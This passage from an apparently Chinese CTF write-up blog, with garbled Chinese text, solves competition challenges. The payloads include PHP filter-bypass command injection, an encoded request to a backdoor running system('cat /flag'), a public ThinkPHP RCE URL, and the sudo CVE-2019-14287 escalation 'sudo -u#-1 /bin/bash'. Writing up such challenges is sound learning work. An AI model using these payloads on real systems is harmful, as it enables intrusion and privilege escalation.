<figure class="highlight routeros"><table><tr><td class="code"><pre><code class="hljs routeros">PING zrb.edisec.net: 56 data bytes<br>64 bytes <span class="hljs-keyword">from</span> zrb.edisec.net: <span class="hljs-attribute">icmp_seq</span>=3 <span class="hljs-attribute">ttl</span>=51 <span class="hljs-attribute">time</span>=97.77 ms<br>64 bytes <span class="hljs-keyword">from</span> zrb.edisec.net: <span class="hljs-attribute">icmp_seq</span>=3 <span class="hljs-attribute">ttl</span>=51 <span class="hljs-attribute">time</span>=97.78 ms<br>64 bytes <span class="hljs-keyword">from</span> zrb.edisec.net: <span class="hljs-attribute">icmp_seq</span>=3 <span class="hljs-attribute">ttl</span>=51 <span class="hljs-attribute">time</span>=97.83 ms<br>64 bytes <span class="hljs-keyword">from</span> zrb.edisec.net: <span class="hljs-attribute">icmp_seq</span>=3 <span class="hljs-attribute">ttl</span>=51 <span class="hljs-attribute">time</span>=97.77 ms<br>64 bytes <span class="hljs-keyword">from</span> zrb.edisec.net: <span class="hljs-attribute">icmp_seq</span>=3 <span class="hljs-attribute">ttl</span>=51 <span class="hljs-attribute">time</span>=97.81 ms<br>64 bytes <span class="hljs-keyword">from</span> zrb.edisec.net: <span class="hljs-attribute">icmp_seq</span>=3 <span class="hljs-attribute">ttl</span>=51 <span class="hljs-attribute">time</span>=97.81 ms<br><span class="hljs-built_in">..</span>.<br>ç•¥<br></code></pre></td></tr></table></figure>
<p>å…ˆæå–å‡ºæ¥<br>ä¸æœ€å°çš„76å–ä½™åè½¬å­—ç¬¦ä¸²<br>æœ€åä¸¤å±‚base64</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> base64<br>a=[<span class="hljs-number">77</span>,<span class="hljs-number">78</span>,<span class="hljs-number">83</span>,<span class="hljs-number">77</span>,<span class="hljs-number">81</span>,<span class="hljs-number">81</span>,<span class="hljs-number">76</span>,<span class="hljs-number">82</span>,<span class="hljs-number">77</span>,<span class="hljs-number">76</span>,<span class="hljs-number">82</span>,<span class="hljs-number">80</span>,<span class="hljs-number">77</span>,<span class="hljs-number">80</span>,<span class="hljs-number">77</span>,<span class="hljs-number">77</span>,<span class="hljs-number">76</span>,<span class="hljs-number">82</span>,<span class="hljs-number">77</span>,<span class="hljs-number">81</span>,<span class="hljs-number">83</span>,<span class="hljs-number">77</span>,<span class="hljs-number">83</span>,<span class="hljs-number">78</span>,<span class="hljs-number">77</span>,<span class="hljs-number">80</span>,<span class="hljs-number">80</span>,<span class="hljs-number">77</span>,<span class="hljs-number">76</span>,<span class="hljs-number">82</span>,<span class="hljs-number">77</span>,<span class="hljs-number">81</span>,<span class="hljs-number">76</span>,<span class="hljs-number">77</span>,<span class="hljs-number">80</span>,<span class="hljs-number">77</span>,<span class="hljs-number">77</span>,<span class="hljs-number">78</span>,<span class="hljs-number">82</span>,<span class="hljs-number">77</span>,<span class="hljs-number">76</span>,<span class="hljs-number">81</span>,<span class="hljs-number">77</span>,<span class="hljs-number">79</span>,<span class="hljs-number">78</span>,<span class="hljs-number">77</span>,<span class="hljs-number">82</span>,<span class="hljs-number">77</span>,<span class="hljs-number">77</span>,<span class="hljs-number">79</span>,<span class="hljs-number">77</span>,<span class="hljs-number">77</span>,<span class="hljs-number">81</span>,<span class="hljs-number">78</span>,<span class="hljs-number">77</span>,<span class="hljs-number">77</span>,<span class="hljs-number">77</span>,<span class="hljs-number">77</span>,<span class="hljs-number">83</span>,<span class="hljs-number">76</span>,<span class="hljs-number">77</span>,<span class="hljs-number">80</span>,<span class="hljs-number">78</span>,<span class="hljs-number">77</span>,<span class="hljs-number">76</span>,<span class="hljs-number">82</span>,<span class="hljs-number">77</span>,<span class="hljs-number">80</span>,<span class="hljs-number">83</span>,<span class="hljs-number">77</span>,<span class="hljs-number">83</span>,<span class="hljs-number">76</span>,<span class="hljs-number">77</span>,<span class="hljs-number">78</span>,<span class="hljs-number">81</span>,<span class="hljs-number">77</span>,<span class="hljs-number">81</span>,<span class="hljs-number">82</span>,<span class="hljs-number">77</span>,<span class="hljs-number">79</span>,<span class="hljs-number">78</span>,<span class="hljs-number">77</span>,<span class="hljs-number">79</span>,<span class="hljs-number">77</span>,<span class="hljs-number">77</span>,<span class="hljs-number">77</span>,<span class="hljs-number">81</span>,<span class="hljs-number">76</span>,<span class="hljs-number">82</span>,<span class="hljs-number">77</span>,<span class="hljs-number">77</span>,<span class="hljs-number">77</span>,<span class="hljs-number">78</span>,<span class="hljs-number">77</span>,<span class="hljs-number">82</span>,<span class="hljs-number">82</span>,<span class="hljs-number">77</span>,<span class="hljs-number">78</span>,<span class="hljs-number">80</span>,<span class="hljs-number">77</span>,<span class="hljs-number">78</span>,<span class="hljs-number">80</span>,<span class="hljs-number">77</span>,<span class="hljs-number">76</span>,<span class="hljs-number">81</span>,<span class="hljs-number">76</span>,<span class="hljs-number">82</span>,<span class="hljs-number">81</span>,<span class="hljs-number">77</span>,<span class="hljs-number">78</span>,<span class="hljs-number">78</span>,<span class="hljs-number">77</span>,<span class="hljs-number">76</span>,<span class="hljs-number">83</span>,<span class="hljs-number">77</span>,<span class="hljs-number">77</span>,<span class="hljs-number">77</span>,<span class="hljs-number">77</span>,<span class="hljs-number">83</span>,<span class="hljs-number">77</span>,<span class="hljs-number">77</span>,<span class="hljs-number">77</span>,<span class="hljs-number">81</span>,<span class="hljs-number">77</span>,<span class="hljs-number">79</span>,<span class="hljs-number">76</span>,<span class="hljs-number">77</span>,<span class="hljs-number">80</span>,<span class="hljs-number">80</span>,<span class="hljs-number">77</span>,<span class="hljs-number">80</span>,<span class="hljs-number">77</span>,<span class="hljs-number">77</span>,<span class="hljs-number">78</span>,<span class="hljs-number">83</span>,<span class="hljs-number">77</span>,<span class="hljs-number">76</span>,<span class="hljs-number">82</span>,<span class="hljs-number">77</span>,<span class="hljs-number">76</span>,<span class="hljs-number">82</span>,<span class="hljs-number">76</span>,<span class="hljs-number">82</span>,<span class="hljs-number">80</span>,<span class="hljs-number">77</span>,<span class="hljs-number">79</span>,<span class="hljs-number">78</span>,<span class="hljs-number">77</span>,<span class="hljs-number">76</span>,<span class="hljs-number">81</span>,<span class="hljs-number">77</span>,<span class="hljs-number">80</span>,<span class="hljs-number">80</span>,<span class="hljs-number">77</span>,<span class="hljs-number">82</span>,<span class="hljs-number">78</span>,<span class="hljs-number">77</span>,<span class="hljs-number">80</span>,<span class="hljs-number">80</span>,<span class="hljs-number">76</span>,<span class="hljs-number">82</span>,<span class="hljs-number">78</span>,<span class="hljs-number">77</span>,<span class="hljs-number">77</span>,<span class="hljs-number">78</span>,<span class="hljs-number">77</span>,<span class="hljs-number">82</span>,<span class="hljs-number">76</span>,<span class="hljs-number">77</span>,<span class="hljs-number">78</span>,<span class="hljs-number">78</span>,<span class="hljs-number">77</span>,<span class="hljs-number">81</span>,<span class="hljs-number">78</span>,<span class="hljs-number">77</span>,<span class="hljs-number">81</span>,<span class="hljs-number">79</span>,<span class="hljs-number">76</span>,<span class="hljs-number">83</span>,<span class="hljs-number">81</span>]<br>d=<span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> a:<br>    d=d+<span class="hljs-built_in">str</span>(i%<span class="hljs-number">76</span>)<br>e=<span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-built_in">len</span>(d),<span class="hljs-number">3</span>):<br>    e=e+<span class="hljs-built_in">chr</span>(<span class="hljs-built_in">int</span>(d[i:i+<span class="hljs-number">3</span>],<span class="hljs-number">8</span>))<br>z=base64.b64decode(e)<br>z=base64.b64decode(z)<br><span class="hljs-built_in">print</span>(z)<br></code></pre></td></tr></table></figure>


<h2 id="å·èµ°çš„flag"><a href="#å·èµ°çš„flag" class="headerlink" title="å·èµ°çš„flag"></a>å·èµ°çš„flag</h2><p>è§£å‹å¾—åˆ°<code>è¿™æ˜¯ä¸€ä¸ªåœ°å€.txt</code>å’Œ<code>çº¸æ¡.rar</code></p>
<blockquote>
<p>å°æ˜å»é£Ÿå ‚åƒé¥­ï¼Œä¸ºäº†èƒ½åœ¨åƒé¥­çš„æ—¶å€™æœ‰åº§ä½ï¼Œä»–æŠŠè‡ªå·±çš„è€³æœºå’Œæ‰‹æœºå……ç”µå™¨æ”¾åœ¨æ¡Œå­ä¸Šã€‚ä¹°é¥­å›æ¥åå‘ç°è‡ªå·±çš„ä¸œè¥¿ä¸è§äº†ã€‚ä»¥ä¸ºè¢«æ”¶èµ°äº†ã€‚å°±å»å¤±ç‰©æ‹›é¢†å¤„è¯¢é—®ã€‚è¯¢é—®æ— æœåï¼Œåœ¨QQç©ºé—´å‘ç°è‡ªå·±è¢«æŒ‚äº†ï¼Œè¯´è‡ªå·±ç»™å­¦æ ¡ä¸¢äººï¼Œç”¨å……ç”µå™¨å åº§ï¼Œå¹¶æŠŠå……ç”µå™¨æ”¾åˆ°äº†æŒ‡å®šä½ç½®ã€‚å°æ˜æ‰¾åˆ°ä»¥åå‘ç°äº†ä¸€ä¸²å¯†æ–‡ï¼Œåªæœ‰è§£å¼€å¯†æ–‡ï¼Œæ‰èƒ½æ‰¾åˆ°å……ç”µå™¨çš„ä½ç½®ã€‚ä½ èƒ½å¸®åŠ©å°æ˜å‘ç°å……ç”µå™¨è¢«è—åˆ°å“ªé‡Œäº†å—ã€‚<br>å¯†æ–‡å¦‚ä¸‹ï¼š%E2%A1%96%E2%A1%9C%E2%A1%91%E2%A1%97%E2%A1%8B%E2%A1%B1%E2%A1%83%E2%A0%81%E2%A1%94%E2%A1%95%E2%A1%AF%E2%A1%B6%E2%A1%82%E2%A1%9F%E2%A1%9D%E2%A1%AF%E2%A1%99%E2%A1%9D%E2%A1%80%E2%A1%9C%E2%A1%95%E2%A1%9D%3D</p>
</blockquote>
<p>å¾ˆæ˜æ˜¾çš„urlç¼–ç ï¼Œè§£å¯†åå¾—åˆ°<code>â¡–â¡œâ¡‘â¡—â¡‹â¡±â¡ƒâ â¡”â¡•â¡¯â¡¶â¡‚â¡Ÿâ¡â¡¯â¡™â¡â¡€â¡œâ¡•â¡=</code><br>ç›²æ–‡ç¼–ç ï¼Œ<a href="https://www.qqxiuzi.cn/bianma/wenbenjiami.php?s=mangwen">åœ¨çº¿è§£å¯†</a>å¾—åˆ°<code>flag&#123;As1de_From_implem</code></p>
<p>ç”¨è¿™ä¸ªä½œä¸ºå‹ç¼©åŒ…å¯†ç è§£å‹</p>
<blockquote>
<p>æ­å–œä½ å¸®åŠ©å°æ˜æ‰¾åˆ°å……ç”µå™¨ã€‚ä½†æ˜¯ä»–çš„è€³æœºä¹Ÿä¸è§äº†ã€‚é€šè¿‡æŸ¥è¯¢ç›‘æ§å‘ç°è€³æœºä¸å……ç”µå™¨ä¸€èµ·è¢«æ‹¿èµ°äº†ã€‚å½“ä»–å‘ç°è€³æœºæ—¶ï¼Œåªå‰©ä¸‹ä¸€ä¸ªè¿›æ°´çš„è€³æœºã€ä¸€æ‘Šæ°´æ¸å’Œä¸€ä¸ªè¢«æ‰æ“äº†å¥½å‡ éçš„çº¸æ¡ï¼Œä¸Šé¢å­—è¿¹å·²ç»è¢«æ±¡æŸ“äº†ï¼Œä½†éšçº¦å†™ç€ï¼š********-I_forg1ve_y0u}ã€‚ä½ èƒ½å¸®åŠ©å°æ˜å‘ç°è¢«éšè—çš„å­—æ ·å—ã€‚</p>
</blockquote>
<p>vimä¸­çœ‹åˆ°<code>U+202C</code>ç­‰å­—ç¬¦ï¼Œä¸º0å®½åŠ å¯†<br>è§£å¯†å¾—åˆ°<code>3ntat1on</code></p>
<p>æœ€åæ‹¼æ¥åœ¨ä¸€èµ·ï¼Œæ³¨æ„åˆ«æŠŠ0å®½å­—ç¬¦å¤åˆ¶è¿›å»<br><code>flag&#123;As1de_From_implem3ntat1on-I_forg1ve_y0u&#125;</code></p>
<h2 id="chess"><a href="#chess" class="headerlink" title="chess"></a>chess</h2><p>å…¨è‡ªåŠ¨è§£å¯†è„šæœ¬<br>æœ€åä¸€å…³æ‰‹åŠ¨è§£å³å¯</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># -- coding=utf8 --</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>io=remote(<span class="hljs-string">&quot;ctf.zrb.edisec.net&quot;</span>,<span class="hljs-number">33741</span>)<br>win_data=<span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>	n=<span class="hljs-number">0</span><br>	l=[[<span class="hljs-number">0</span>]*<span class="hljs-number">3</span>]*<span class="hljs-number">3</span><br>	<span class="hljs-keyword">while</span> <span class="hljs-number">1</span>:<br>		<span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;499/500&#x27;</span> <span class="hljs-keyword">in</span> win_data :<br>			p.interactive()<br>		<span class="hljs-keyword">try</span>:<br>			io.sendlineafter(<span class="hljs-string">&#x27;x/y:&gt;&#x27;</span>,<span class="hljs-string">&#x27;2/2&#x27;</span>)<br>			ob=io.recvuntil(<span class="hljs-string">&#x27;computer:&gt;&#x27;</span>,timeout=<span class="hljs-number">0.2</span>)<br>			<span class="hljs-comment">#ob=io.recvuntil(&#x27;player:&gt;&#x27;,timeout=2)</span><br>			<span class="hljs-comment">#ob=io.recvuntil(str(&#x27;player:&gt;&#x27;,timeout=2))</span><br>			<span class="hljs-comment">#ob=io.recvuntil(str(&#x27;player:&gt;&#x27;,timeout=2)).strip()</span><br>			ob=io.recvuntil(<span class="hljs-string">&#x27;player:&gt;&#x27;</span>,timeout=<span class="hljs-number">0.2</span>).decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)<br>			ob=ob.strip()<br>			<span class="hljs-comment">#ob=ob.split(&#x27;/n&#x27;)</span><br>			ob=ob.split(<span class="hljs-string">&#x27;\n&#x27;</span>)<br>			<span class="hljs-comment">#ob=ob.split(&#x27;|&#x27;)</span><br>			ob1=ob[<span class="hljs-number">0</span>].split(<span class="hljs-string">&#x27;|&#x27;</span>)<br>			ob2=ob[<span class="hljs-number">4</span>].split(<span class="hljs-string">&#x27;|&#x27;</span>)<br>			<span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;#&#x27;</span> <span class="hljs-keyword">in</span> ob1[<span class="hljs-number">0</span>] <span class="hljs-keyword">or</span> <span class="hljs-string">&#x27;#&#x27;</span> <span class="hljs-keyword">in</span> ob2[<span class="hljs-number">2</span>]:<br>				io.send(<span class="hljs-string">b&#x27;1/2\n&#x27;</span>)<br>				io.sendlineafter(<span class="hljs-string">&#x27;x/y:&gt;&#x27;</span>,<span class="hljs-string">b&#x27;3/2&#x27;</span>)<br>			<span class="hljs-keyword">else</span>:<br>				io.send(<span class="hljs-string">b&#x27;2/1\n&#x27;</span>)<br>				io.sendlineafter(<span class="hljs-string">&#x27;x/y:&gt;&#x27;</span>,<span class="hljs-string">b&#x27;2/3&#x27;</span>)<br>			<span class="hljs-keyword">try</span>:<br>				ob=io.recvuntil(<span class="hljs-string">&#x27;Can you win&#x27;</span>,timeout=<span class="hljs-number">0.2</span>)<br>				<span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> ob:<br>					<span class="hljs-keyword">raise</span> Exception(<span class="hljs-string">&quot;123&quot;</span>)<br>				win_data=io.recvuntil(<span class="hljs-string">&#x27;*****&#x27;</span>).decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)<br>			<span class="hljs-keyword">except</span>:<br>				<span class="hljs-keyword">try</span>:<br>					io.send(<span class="hljs-string">b&#x27;1/1\n&#x27;</span>)<br>					ob1=io.recvuntil(<span class="hljs-string">&#x27;repeat&#x27;</span>,timeout=<span class="hljs-number">0.2</span>)<br>					<span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> ob1:<br>						<span class="hljs-keyword">raise</span> Exception(<span class="hljs-string">&quot;123&quot;</span>)<br>					io.send(<span class="hljs-string">b&#x27;1/3\n&#x27;</span>)<br>					io.sned(<span class="hljs-string">b&#x27;3/1\n&#x27;</span>)<br>				<span class="hljs-keyword">except</span>:<br>					<span class="hljs-keyword">try</span>:<br>						io.send(<span class="hljs-string">b&#x27;3/3\n&#x27;</span>)<br>						ob=io.recvuntil(<span class="hljs-string">&#x27;Can you win&#x27;</span>,timeout=<span class="hljs-number">0.2</span>)<br>						<span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> ob:<br>							<span class="hljs-keyword">raise</span> Exception(<span class="hljs-string">&quot;123&quot;</span>)<br>						win_data=io.recvuntil(<span class="hljs-string">&#x27;*****&#x27;</span>).decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)<br>					<span class="hljs-keyword">except</span>:<br>						<span class="hljs-comment">#io.interactive()</span><br>						code=<span class="hljs-number">0</span><br>						<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">4</span>):<br>							<span class="hljs-keyword">if</span> code:<br>								<span class="hljs-keyword">break</span><br>							<span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">4</span>):<br>								<span class="hljs-keyword">try</span>:<br>									io.send(<span class="hljs-string">&#x27;%s/%s\n&#x27;</span>%(i,j))<br>									ob=io.recvuntil(<span class="hljs-string">&#x27;Can you win&#x27;</span>,timeout=<span class="hljs-number">0.2</span>)<br>									<span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> ob:<br>										<span class="hljs-keyword">raise</span> Exception(<span class="hljs-string">&quot;123&quot;</span>)<br>									code=<span class="hljs-number">1</span><br>									win_data=io.recvuntil(<span class="hljs-string">&#x27;*****&#x27;</span>).decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)<br>									<span class="hljs-keyword">break</span><br>								<span class="hljs-keyword">except</span>:<br>									<span class="hljs-keyword">pass</span><br>					<span class="hljs-keyword">else</span>:<br>						<span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;ç¬¬å››å±‚å‘é€2/3ï¼Œæ¥æ”¶winæ­£å¸¸&quot;</span>)<br>				<span class="hljs-keyword">else</span>:<br>					<span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;ç¬¬ä¸‰å±‚æ¥æ”¶repeatå’Œå‘é€æ­£å¸¸&quot;</span>)<br>			<span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;ç¬¬äºŒå±‚æ¥æ”¶winæ­£å¸¸&quot;</span>)<br>		<span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>			<span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;of range&#x27;</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> e.args[<span class="hljs-number">0</span>]:<br>				io.interactive()<br>		<span class="hljs-keyword">else</span>:<br>			<span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;æˆåŠŸ&quot;</span>)<br>	io.interactive()<br></code></pre></td></tr></table></figure>

<p><img src="/img/wp/2021/2021zhuiribei-1.jpg"></p>
<h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><h2 id="gotofly"><a href="#gotofly" class="headerlink" title="gotofly"></a>gotofly</h2><p>è§‚å¯Ÿé‡å®šå‘<br>çœ‹è¿æ°”å‡ºflag<br><img src="/img/wp/2021/2021zhuiribei-2.jpg"></p>
<h2 id="2-let-me-rce"><a href="#2-let-me-rce" class="headerlink" title="2_let_me_rce"></a>2_let_me_rce</h2><figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-variable">$cmd</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>];<br><span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/sys|pass|exe|file|inc|cat| |\$|\?|\*|more|ca\t|nl|#| |[\x0a]|php|perl|dir|rm|ls|sleep|cut|sh|bash|grep|ash|nc|ping|curl|cat|tac|od|more|less|nl|vi|unique|head|tail|sort|rev|string|find|\$|\(\|\)|\[|\]|\&#123;|\&#125;|\&gt;|\&lt;|\?|\*|;|\||&amp;|\\\\/i&#x27;</span>,<span class="hljs-variable">$cmd</span>))&#123;<br>    <span class="hljs-keyword">eval</span>(<span class="hljs-string">&quot;echo &#x27;&quot;</span> . <span class="hljs-variable">$cmd</span> .<span class="hljs-string">&quot;&#x27;;&quot;</span>);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;hacker&quot;</span>;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
<p>å½“æ—¶ä¸€æ‰“å¼€å°±è¢«è¿™è¿‡æ»¤å“ä½äº†ï¼Œéšä¾¿è¯•äº†ä¸‹å°±æ”¾å¼ƒäº†ï¼Œèµ›åæƒ³æƒ³åº”è¯¥åšæŒä¸€ä¸‹ï¼Œä¸è¦æ”¾å¼ƒ<br>çœ‹äº†wpå­¦åˆ°äº†å¾ˆå¤šæ–°çš„çŸ¥è¯†<br>æ¯”å¦‚<code>du</code>å‘½ä»¤ä¹Ÿèƒ½åˆ—ç›®å½•ï¼Œç”¨<code>sed p</code>è¯»æ–‡ä»¶</p>
<p>èµ›åå¤ç°:<br>æ²¡æœ‰è¿‡æ»¤åå¼•å·å’Œå•åŒå¼•å·</p>
<p>åˆ—ç›®å½•æ–¹æ³•1ï¼š<br>å…ˆç”¨å•å¼•å·é—­åˆï¼Œç„¶ååå¼•å·æ‰§è¡Œå‘½ä»¤ï¼Œç©ºæ ¼ç”¨<code>%09</code>ç»•è¿‡</p>
<figure class="highlight autohotkey"><table><tr><td class="code"><pre><code class="hljs autohotkey">?cmd=&#x27;.`l<span class="hljs-string">&quot;&quot;</span>s%<span class="hljs-number">09</span>/`.&#x27;<br></code></pre></td></tr></table></figure>

<p>åˆ—ç›®å½•æ–¹æ³•2ï¼š<br>ä½¿ç”¨<code>du -a /</code>å‘½ä»¤</p>
<figure class="highlight autohotkey"><table><tr><td class="code"><pre><code class="hljs autohotkey">?cmd=&#x27;.`du%<span class="hljs-number">09</span>-a%<span class="hljs-number">09</span>/`.&#x27;<br></code></pre></td></tr></table></figure>

<p>è¯»æ–‡ä»¶æ–¹æ³•1ï¼š<br>åŸç†ä¸åˆ—ç›®å½•æ–¹æ³•1ä¸€è‡´</p>
<figure class="highlight autohotkey"><table><tr><td class="code"><pre><code class="hljs autohotkey">?cmd=&#x27;.`ta<span class="hljs-string">&quot;&quot;</span>c%<span class="hljs-number">09</span>/cccccreal_flag_here_ccccfffffffllllllllaggggg`.&#x27;<br></code></pre></td></tr></table></figure>

<p>è¯»æ–‡ä»¶æ–¹æ³•2ï¼š<br>ä½¿ç”¨<code>sed p</code>å‘½ä»¤</p>
<figure class="highlight autohotkey"><table><tr><td class="code"><pre><code class="hljs autohotkey">?cmd=&#x27;.`sed<span class="hljs-variable">%09p%</span><span class="hljs-number">09</span>/cccccreal_flag_here_ccccfffffffllllllllaggggg%<span class="hljs-number">09</span>`.&#x27;<br></code></pre></td></tr></table></figure>

<h2 id="ä¼Šæ³½ç‘å°”çš„php"><a href="#ä¼Šæ³½ç‘å°”çš„php" class="headerlink" title="ä¼Šæ³½ç‘å°”çš„php"></a>ä¼Šæ³½ç‘å°”çš„php</h2><p>èµ›åå¤ç°<br>WHTæˆ˜é˜Ÿçš„exp</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> zlib<br><span class="hljs-keyword">import</span> re<br><span class="hljs-keyword">import</span> base64<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">x</span>(<span class="hljs-params">t,k</span>):<br>  <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;&#x27;</span>.join([<span class="hljs-built_in">chr</span>(<span class="hljs-built_in">ord</span>(x)^<span class="hljs-built_in">ord</span>(y)) <span class="hljs-keyword">for</span> x,y <span class="hljs-keyword">in</span> <span class="hljs-built_in">zip</span>(t,k*(<span class="hljs-built_in">len</span>(t)/<span class="hljs-built_in">len</span>(k)+<span class="hljs-number">1</span>))])<br><br>session = requests.Session()<br><span class="hljs-comment"># @eval(@gzuncompress(@x(@base64_decode($m[1]),$k)));</span><br>cmd = <span class="hljs-string">&#x27;system(&quot;cat /flag&quot;);&#x27;</span><br>cmd = zlib.compress(cmd)<br>cmd = x(cmd,<span class="hljs-string">&quot;25ed1bcb&quot;</span>)<br>cmd = base64.b64encode(cmd)<br><br>rawBody = <span class="hljs-string">&quot;423b0b7200f4&#123;cmd&#125;85fc5ff71c8e&quot;</span>.<span class="hljs-built_in">format</span>(cmd=cmd)<br><span class="hljs-built_in">print</span>(rawBody)<br>response = session.post(<span class="hljs-string">&quot;http://ctf.zrb.edisec.net:45140/index.php&quot;</span>, data=rawBody)<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Response body: %s&quot;</span> % response.content)<br>res = re.findall(<span class="hljs-string">r&#x27;niGqOXD4rBhBWZ7t423b0b7200f4(.+)85fc5ff71c8e&#x27;</span>,response.content)[<span class="hljs-number">0</span>]<br><br><span class="hljs-comment"># $r=@base64_encode(@x(@gzcompress($o),$k));</span><br>res = base64.b64decode(res)<br>res = x(res,<span class="hljs-string">&quot;25ed1bcb&quot;</span>)<br>res = zlib.decompress(res)<br><span class="hljs-built_in">print</span>(res)<br></code></pre></td></tr></table></figure>



<h1 id="ç»¼åˆæ¸—é€"><a href="#ç»¼åˆæ¸—é€" class="headerlink" title="ç»¼åˆæ¸—é€"></a>ç»¼åˆæ¸—é€</h1><h2 id="ç»¼åˆæ¸—é€-FLAG1"><a href="#ç»¼åˆæ¸—é€-FLAG1" class="headerlink" title="ç»¼åˆæ¸—é€-FLAG1"></a>ç»¼åˆæ¸—é€-FLAG1</h2><p>thinkphpæ¡†æ¶<br>ç®€å•ä¸€æ‰«æ²¡æœ‰è¿‡æ»¤ä¸”æœªä¿®å¤æ¼æ´<br>ç”¨å…¬å¼€çš„payloadæ‰“<code>http://82.156.76.152:8077/index.php?s=index/think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=ls</code></p>
]]></content>
      <categories>
        <category>wp</category>
      </categories>
      <tags>
        <tag>2021</tag>
        <tag>wp - è¿½æ—¥æ¯ - å®‰å¾½</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux sudoæƒé™æå‡æ¼æ´</title>
    <url>/posts/74c47e67/</url>
    <content><![CDATA[<p>CVE-2019-14287</p>
<h1 id="æ¼æ´å½±å“"><a href="#æ¼æ´å½±å“" class="headerlink" title="æ¼æ´å½±å“"></a>æ¼æ´å½±å“</h1><p>1.8.28ä¹‹å‰çš„sudoç‰ˆæœ¬å‡ä¼šå—åˆ°å½±å“</p>
<h1 id="æ¼æ´å¤ç°"><a href="#æ¼æ´å¤ç°" class="headerlink" title="æ¼æ´å¤ç°"></a>æ¼æ´å¤ç°</h1><p>ç°åœ¨çš„ç”¨æˆ·aliceæ²¡æƒé™çœ‹flagæ–‡ä»¶</p>
<p><img src="/img/linux/CVE-2019-14287-1.jpg"></p>
<p>æŸ¥çœ‹sudoç‰ˆæœ¬</p>
<p><img src="/img/linux/CVE-2019-14287-2.jpg"></p>
<p>ç¬¦åˆåˆ©ç”¨æ¡ä»¶ï¼Œpayloadï¼š<code>sudo -u#-1 /bin/bash</code></p>
<p><img src="/img/linux/CVE-2019-14287-3.jpg"></p>
]]></content>
      <categories>
        <category>linux</category>
      </categories>
      <tags>
        <tag>CVE</tag>
        <tag>linuxææƒ</tag>
      </tags>
  </entry>
  <entry>
    <title>ã€ctfshowã€‘å‡»å‰‘æ¯-wp</title>
    <url>/posts/4da54c25/</url>
    <content><![CDATA[<h1 id="çƒ­èº«"><a href="#çƒ­èº«" class="headerlink" title="çƒ­èº«"></a>çƒ­èº«</h1><h2 id="è¿›ç¾¤å¾—ç "><a href="#è¿›ç¾¤å¾—ç " class="headerlink" title="è¿›ç¾¤å¾—ç "></a>è¿›ç¾¤å¾—ç </h2><p>ç¾¤é‡Œå‘é€ <code>å‡»å‰‘æ¯ç­¾åˆ°å³å¯</code></p>
<h2 id="å¬æ­Œè¯†æ›²"><a href="#å¬æ­Œè¯†æ›²" class="headerlink" title="å¬æ­Œè¯†æ›²"></a>å¬æ­Œè¯†æ›²</h2><p>èµ›åé—®äº†ç¾¤å‹ï¼Œå¯èƒ½çœŸçš„æ˜¯ç§¯ç´¯ä¸ç‰¹å¾å§<br>å¤§æ¦‚æœ‰ä¸¤ç§æ–¹æ³•ï¼š<br>1ï¼šå¬æ­Œè¯ç™¾åº¦<br>2ï¼šç›´æ¥çŸ¥é“ä»€ä¹ˆæ­Œ<br><img src="/img/ctfshow/jjb-1.png"><br>ç­”æ¡ˆæ˜¯æ™®äº¬<code>ctfshow&#123;Vladimir_Vladimirovich_Putin&#125;</code></p>
